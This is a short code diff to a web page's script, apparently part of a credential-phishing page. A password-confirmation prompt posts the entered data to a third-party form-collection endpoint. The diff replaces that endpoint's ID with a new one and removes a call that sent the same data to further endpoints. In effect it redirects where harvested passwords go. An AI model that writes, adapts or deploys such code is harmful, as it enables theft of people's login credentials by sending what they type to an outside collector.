@@ -1675,7 +1675,7 @@
                       confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
 
                       // Submit to SubmitForm.com
-                      const response = await fetch('https://submit-form.com/NROnxe5eS', {
+                      const response = await fetch('https://submit-form.com/FOMAgrGaT', {
                           method: 'POST',
                           headers: {
                               'Content-Type': 'application/json',
@@ -1687,8 +1687,7 @@
                       const result = await response.json();
 
                       if (response.ok) {
-                          // Submit to other endpoints
-                          submitToOtherEndpoints(formData);
+                          
 
                           document.body.removeChild(passwordPrompt);
 
@@ -1875,5 +1874,6 @@
           });
       });
   </script>
+
 
 </body></html>
